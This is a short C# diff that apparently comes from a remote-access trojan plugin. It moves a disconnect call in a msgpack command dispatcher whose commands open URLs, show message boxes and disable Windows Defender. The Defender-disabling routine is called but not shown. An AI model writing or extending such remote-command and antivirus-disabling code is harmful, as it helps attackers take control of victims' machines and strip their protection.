@@ -30,21 +30,18 @@ namespace Plugin
                             {
                                 Process.Start(url);
                             }
-                            Connection.Disconnected();
                             break;
                         }
 
                     case "sendMessage":
                         {
                             MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
-                            Connection.Disconnected();
                             break;
                         }
 
                     case "disableDefedner":
                         {
                             new HandleDisableDefender().Run();
-                            Connection.Disconnected();
                             break;
                         }
 
@@ -54,6 +51,7 @@ namespace Plugin
             {
                 Error(ex.Message);
             }
+            Connection.Disconnected();
         }
 
         public static void Error(string ex)
